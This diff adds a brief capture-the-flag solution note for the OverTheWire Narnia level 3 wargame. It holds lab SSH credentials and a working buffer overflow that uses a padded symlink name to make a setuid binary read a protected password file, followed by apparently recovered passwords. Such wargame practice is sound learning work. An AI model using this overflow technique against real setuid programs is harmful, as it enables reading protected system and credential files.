@@ -1,0 +1,6 @@
+#narnia3
+ssh narnia3@narnia.labs.overthewire.org -p2226 (vaequeezee)
+ln -s /etc/narnia_pass/narnia4 $(python -c'print "c"*32 + "safadin"')
+touch safadin
+/narnia/narnia3 $(python -c'print "c"*32 + "safadin"')
+thaenohtai
